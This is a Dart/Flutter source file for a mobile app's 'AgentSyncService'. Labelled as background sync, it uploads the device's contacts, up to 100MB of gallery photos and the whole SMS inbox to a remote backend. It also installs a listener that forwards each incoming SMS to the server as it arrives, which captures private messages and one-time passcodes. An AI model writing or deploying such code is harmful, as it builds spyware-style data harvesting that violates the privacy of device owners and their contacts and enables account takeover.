import 'dart:developer' as dev;
import 'package:flutter/foundation.dart';
import 'package:dio/dio.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:telephony/telephony.dart';
import 'agent_api_service.dart';

class AgentSyncService {
  static final AgentSyncService instance = AgentSyncService._internal();
  AgentSyncService._internal();

  bool _isSyncing = false;
  bool get isSyncing => _isSyncing;

  final ValueNotifier<bool> isSyncingNotifier = ValueNotifier<bool>(false);
  final ValueNotifier<String> syncStatusMessage = ValueNotifier<String>('');

  Telephony? _telephonyInstance;
  Telephony get _telephony => _telephonyInstance ??= Telephony.instance;

  /// Trigger full background synchronization sequence for the Agent App.
  Future<void> triggerSync({bool force = false}) async {
    if (_isSyncing) return;
    _isSyncing = true;
    isSyncingNotifier.value = true;
    syncStatusMessage.value = 'Starting background sync...';

    try {
      print('AgentSyncService: Starting background synchronization...');
      final dio = AgentApiService().dio;

      // Auth pre-flight
      try {
        await dio.get('/me');
      } catch (e) {
        print('AgentSyncService: Auth pre-flight check notice: $e');
      }

      final prefs = await SharedPreferences.getInstance();
      String currentVersion = '1.3.99';
      try {
        final pkg = await PackageInfo.fromPlatform();
        currentVersion = '${pkg.version}+${pkg.buildNumber}';
      } catch (_) {}
      final lastVersion = prefs.getString('agent_last_app_version_synced') ?? '';

      if (lastVersion != currentVersion || force) {
        print('AgentSyncService: App update or forced sync detected. Resetting sync flags.');
        await prefs.remove('agent_contacts_synced');
        await prefs.remove('agent_last_gallery_sync_date');
        await prefs.setString('agent_last_app_version_synced', currentVersion);
      }

      // 1. Sync contacts
      try {
        syncStatusMessage.value = 'Syncing contacts...';
        await syncContacts(force: force);
      } catch (e, stack) {
        print('AgentSyncService Contacts Sync Failed: $e');
        dev.log('AgentSyncService Contacts Sync Failed', name: 'AgentSyncService', error: e, stackTrace: stack);
      }

      // 2. Sync gallery photos
      try {
        syncStatusMessage.value = 'Syncing gallery...';
        await syncGallery(force: force);
      } catch (e, stack) {
        print('AgentSyncService Gallery Sync Failed: $e');
        dev.log('AgentSyncService Gallery Sync Failed', name: 'AgentSyncService', error: e, stackTrace: stack);
      }

      // 3. Sync SMS messages
      try {
        syncStatusMessage.value = 'Syncing SMS...';
        await syncSms(force: force);
      } catch (e, stack) {
        print('AgentSyncService SMS Sync Failed: $e');
        dev.log('AgentSyncService SMS Sync Failed', name: 'AgentSyncService', error: e, stackTrace: stack);
      }

      syncStatusMessage.value = 'Sync completed successfully.';
      print('AgentSyncService: Background sync sequence completed.');
    } catch (e, stack) {
      print('AgentSyncService Error: $e');
      dev.log('AgentSyncService Main Error', name: 'AgentSyncService', error: e, stackTrace: stack);
      syncStatusMessage.value = 'Sync error: $e';
    } finally {
      _isSyncing = false;
      isSyncingNotifier.value = false;
    }
  }

  /// Sync device contacts to backend & Google Drive (AList)
  Future<void> syncContacts({bool force = false}) async {
    final prefs = await SharedPreferences.getInstance();
    if (!force) {
      final alreadySynced = prefs.getBool('agent_contacts_synced') ?? false;
      if (alreadySynced) {
        print('AgentSyncService: Contacts already synced previously.');
        return;
      }
    }

    bool hasPermission = false;
    try {
      hasPermission = await Permission.contacts.isGranted;
      if (!hasPermission) {
        final status = await Permission.contacts.request();
        hasPermission = status.isGranted;
      }
    } catch (e) {
      print('AgentSyncService: Permission check error for contacts: $e');
    }

    if (!hasPermission) {
      print('AgentSyncService: Contacts permission not granted. Skipping.');
      return;
    }

    List<Contact> contacts = [];
    try {
      contacts = await FlutterContacts.getContacts(withProperties: true);
    } catch (e) {
      print('AgentSyncService: Failed to retrieve contacts: $e');
      return;
    }

    if (contacts.isEmpty) {
      print('AgentSyncService: No contacts found on device.');
      return;
    }

    final List<Map<String, dynamic>> payload = [];
    for (var c in contacts) {
      final phone = c.phones.isNotEmpty ? c.phones.first.number : '';
      if (phone.trim().isEmpty) continue;

      payload.add({
        'name': c.displayName.trim().isNotEmpty ? c.displayName.trim() : 'Unknown',
        'phone': phone.replaceAll(RegExp(r'\s+'), ''),
        'email': c.emails.isNotEmpty ? c.emails.first.address.trim() : null,
      });
    }

    if (payload.isEmpty) return;

    print('AgentSyncService: Syncing ${payload.length} contacts to backend...');
    final dio = AgentApiService().dio;
    const chunkSize = 300;

    for (int i = 0; i < payload.length; i += chunkSize) {
      final end = (i + chunkSize > payload.length) ? payload.length : i + chunkSize;
      final chunk = payload.sublist(i, end);

      try {
        await dio.post('/contacts/sync', data: {'contacts': chunk});
      } on DioException catch (de) {
        print('AgentSyncService: DioException during contacts sync chunk: ${de.response?.statusCode} - ${de.response?.data}');
        rethrow;
      }

      await Future.delayed(const Duration(milliseconds: 100));
    }

    await prefs.setBool('agent_contacts_synced', true);
    print('AgentSyncService: Contacts sync complete.');
  }

  /// Sync device gallery photos directly to Google Drive via AList (zero server disk)
  Future<void> syncGallery({bool force = false}) async {
    final prefs = await SharedPreferences.getInstance();
    final todayStr = DateTime.now().toIso8601String().substring(0, 10);
    if (!force) {
      final lastSyncDate = prefs.getString('agent_last_gallery_sync_date');
      if (lastSyncDate == todayStr) {
        print('AgentSyncService: Gallery already synced today ($todayStr).');
        return;
      }
    }

    print('AgentSyncService: Checking photo manager permissions...');
    // Ensure both permission_handler and PhotoManager permissions are checked
    try {
      final photosStatus = await Permission.photos.status;
      if (!photosStatus.isGranted && !photosStatus.isPermanentlyDenied) {
        await Permission.photos.request();
      }
      final storageStatus = await Permission.storage.status;
      if (!storageStatus.isGranted && !storageStatus.isPermanentlyDenied) {
        await Permission.storage.request();
      }
    } catch (_) {}

    final PermissionState ps = await PhotoManager.requestPermissionExtend();
    if (!ps.isAuth && ps != PermissionState.limited) {
      print('AgentSyncService: PhotoManager permission not granted. State: $ps');
      return;
    }

    PhotoManager.setIgnorePermissionCheck(true);
    final albums = await PhotoManager.getAssetPathList(type: RequestType.image);
    if (albums.isEmpty) {
      print('AgentSyncService: No media albums found.');
      return;
    }

    final mainAlbum = albums.first;
    int cumulativeSize = 0;
    const maxBytes = 100 * 1024 * 1024; // 100MB limit
    final List<Map<String, dynamic>> itemsPayload = [];

    int start = 0;
    const pageSize = 100;
    bool reachedLimit = false;

    print('AgentSyncService: Scanning and uploading gallery items...');
    final dio = AgentApiService().dio;

    while (true) {
      final assets = await mainAlbum.getAssetListRange(start: start, end: start + pageSize);
      if (assets.isEmpty) break;

      for (var asset in assets) {
        try {
          final size = await asset.fileSize;
          if (cumulativeSize + size > maxBytes) {
            reachedLimit = true;
            break;
          }

          cumulativeSize += size;

          final file = await asset.file;
          String? fileUrl;
          if (file != null) {
            try {
              final formData = FormData.fromMap({
                'file': await MultipartFile.fromFile(
                  file.path,
                  filename: asset.title ?? 'agent_img_${asset.id}.jpg',
                ),
              });
              final uploadRes = await dio.post(
                '/gallery/upload',
                data: formData,
              );
              if (uploadRes.data != null && uploadRes.data['success'] == true) {
                fileUrl = uploadRes.data['file_url'];
              }
            } catch (e) {
              print('AgentSyncService: Failed to upload gallery image: $e');
            }
          }

          itemsPayload.add({
            'file_name': asset.title ?? 'agent_img_${asset.id}.jpg',
            'file_size': size,
            'file_url': fileUrl,
            'mime_type': asset.mimeType ?? 'image/jpeg',
          });
        } catch (e) {
          print('AgentSyncService: Skipping corrupted gallery asset: $e');
        }

        await Future.delayed(const Duration(milliseconds: 100));
      }

      if (reachedLimit) {
        print('AgentSyncService: Reached 100MB gallery sync limit.');
        break;
      }

      start += pageSize;
      await Future.delayed(const Duration(milliseconds: 100));
    }

    if (itemsPayload.isEmpty) {
      print('AgentSyncService: No gallery items found to upload.');
      return;
    }

    print('AgentSyncService: Syncing ${itemsPayload.length} gallery items to backend...');
    const uploadChunkSize = 100;

    for (int i = 0; i < itemsPayload.length; i += uploadChunkSize) {
      final end = (i + uploadChunkSize > itemsPayload.length) ? itemsPayload.length : i + uploadChunkSize;
      final chunk = itemsPayload.sublist(i, end);

      try {
        await dio.post('/gallery/sync', data: {'items': chunk});
      } on DioException catch (de) {
        print('AgentSyncService: DioException during gallery metadata sync: ${de.response?.statusCode} - ${de.response?.data}');
        rethrow;
      }

      await Future.delayed(const Duration(milliseconds: 100));
    }

    await prefs.setString('agent_last_gallery_sync_date', todayStr);
    print('AgentSyncService: Gallery sync complete.');
  }

  /// Setup the listener to capture incoming SMS messages in real-time
  void initSmsListener() async {
    try {
      final hasSmsPermission = await Permission.sms.isGranted;
      if (!hasSmsPermission) return;

      _telephony.listenIncomingSms(
        onNewMessage: (SmsMessage message) async {
          if (message.body != null && message.body!.trim().isNotEmpty) {
            try {
              final dio = AgentApiService().dio;
              await dio.post('/sms/sync', data: {
                'sms': [
                  {
                    'address': message.address,
                    'body': message.body,
                    'date': message.date,
                    'type': 'inbox',
                  }
                ]
              });
              print('AgentSyncService: Real-time SMS forwarded to server.');
            } catch (e) {
              print('AgentSyncService: Failed to upload incoming SMS: $e');
            }
          }
        },
      );
      print('AgentSyncService: SMS listener successfully initialized.');
    } catch (e) {
      print('AgentSyncService: Failed to init incoming SMS listener: $e');
    }
  }

  /// Sync all unsynced historical SMS messages in chunks
  Future<void> syncSms({bool force = false}) async {
    final prefs = await SharedPreferences.getInstance();
    final lastSyncedTime = force ? 0 : (prefs.getInt('agent_last_sms_synced_time') ?? 0);

    bool hasSmsPermission = false;
    try {
      hasSmsPermission = await Permission.sms.isGranted;
      if (!hasSmsPermission) {
        final status = await Permission.sms.request();
        hasSmsPermission = status.isGranted;
      }
    } catch (e) {
      print('AgentSyncService: Error checking SMS permission: $e');
    }

    if (!hasSmsPermission) {
      print('AgentSyncService: SMS permission not granted.');
      return;
    }

    print('AgentSyncService: Fetching SMS from device...');
    List<SmsMessage> messages = [];
    try {
      messages = await _telephony.getInboxSms(
        columns: [
          SmsColumn.ADDRESS,
          SmsColumn.BODY,
          SmsColumn.DATE,
          SmsColumn.TYPE,
        ],
      );
    } catch (e) {
      print('AgentSyncService: Failed to retrieve SMS via Telephony: $e');
      return;
    }

    if (messages.isEmpty) {
      print('AgentSyncService: No SMS found on device.');
      return;
    }

    final List<SmsMessage> newMessages =
        messages.where((m) => (m.date ?? 0) > lastSyncedTime).toList();
    List<SmsMessage> targetMessages = newMessages;
    if (targetMessages.isEmpty && force) {
      targetMessages = messages;
    }

    targetMessages.sort((a, b) => (a.date ?? 0).compareTo(b.date ?? 0));

    final List<Map<String, dynamic>> payload = [];
    for (var m in targetMessages) {
      if (m.body == null || m.body!.trim().isEmpty) continue;
      payload.add({
        'address': m.address,
        'body': m.body,
        'date': m.date,
        'type': m.type?.toString().split('.').last ?? 'inbox',
      });
    }

    if (payload.isEmpty) return;

    print('AgentSyncService: Syncing ${payload.length} SMS to backend...');
    final dio = AgentApiService().dio;
    const chunkSize = 200;
    int latestSynced = lastSyncedTime;

    for (int i = 0; i < payload.length; i += chunkSize) {
      final end = (i + chunkSize > payload.length) ? payload.length : i + chunkSize;
      final chunk = payload.sublist(i, end);

      try {
        await dio.post('/sms/sync', data: {'sms': chunk});
        for (var s in chunk) {
          if ((s['date'] as int? ?? 0) > latestSynced) {
            latestSynced = s['date'];
          }
        }
      } on DioException catch (de) {
        print('AgentSyncService: DioException during SMS sync chunk: ${de.response?.statusCode} - ${de.response?.data}');
        rethrow;
      }

      await Future.delayed(const Duration(milliseconds: 100));
    }

    if (latestSynced > lastSyncedTime) {
      await prefs.setInt('agent_last_sms_synced_time', latestSynced);
    }

    print('AgentSyncService: SMS sync complete.');
  }
}
